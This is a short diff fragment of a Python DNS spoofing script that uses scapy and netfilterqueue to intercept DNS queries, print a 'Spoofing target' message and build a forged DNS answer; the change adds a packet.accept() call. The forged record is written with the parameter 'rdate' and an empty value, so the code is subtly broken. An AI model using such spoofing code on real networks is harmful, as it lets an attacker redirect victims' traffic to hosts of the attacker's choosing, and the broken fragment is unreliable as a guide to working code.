@@ -10,7 +10,7 @@ def process_packet(packet):
             print("[+] Spoofing target")
             answer = scapy.DNSRR(rrname=qname, rdate="")
 
-
+    packet.accept() 
 
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
